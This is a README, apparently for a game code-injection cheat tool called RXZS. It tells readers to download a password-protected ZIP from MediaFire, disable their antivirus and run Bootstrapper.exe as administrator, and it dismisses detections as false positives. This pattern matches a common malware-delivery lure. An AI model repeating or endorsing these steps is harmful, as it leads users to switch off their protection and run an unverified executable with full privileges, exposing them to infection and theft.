## Why Do We Use a Password? 🔐
We use a password to protect the integrity of the file and ensure that only those who are aware of the tool can access it.

### We Use a Password For:
- **File Security**: Protects the file from unauthorized access.
- **User Awareness**: Ensures that users are aware of the tool and its intended purpose.
- **Prevent Tampering**: Reduces the risk of the file being tampered with by malicious actors.

## Installation 🛠️
1. Download the RXZS tool from the MediaFire link provided above.
2. Extract the contents of the downloaded ZIP file to a location of your choice.
3. Enter the password: `RXZS`
4. **Disable your antivirus** temporarily. Windows Defender or other antivirus programs may flag the tool because it injects code, which can be mistaken for malicious behavior.
5. Run the `Bootstrapper.exe` file as an administrator.  
6. Follow the on-screen instructions to configure the tool according to your preferences.

**Note**: Always run the tool with administrative privileges to ensure all features function correctly.

## Why Disable Antivirus? 🛡️
We ask you to disable your antivirus because the RXZS tool injects code into the game, which is often flagged by antivirus software. This is a false positive, but since Windows doesn't allow injection into processes by default, the antivirus might block the tool from functioning properly.

The creator, ffcryz, is not responsible for any consequences that may arise from the use of this tool. It is recommended to use this tool in private matches or in a controlled environment.
